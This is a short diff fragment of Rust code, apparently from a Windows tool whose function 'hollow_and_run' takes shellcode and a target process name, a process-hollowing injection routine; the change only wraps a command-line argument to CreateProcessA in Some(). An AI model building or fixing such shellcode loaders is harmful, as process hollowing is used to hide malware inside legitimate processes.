@@ -26,7 +26,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let creation_result = unsafe {
         CreateProcessA(
             PCSTR::null(),
-            lp_command_line,
+            Some(lp_command_line),
             None,
             None,
             false,
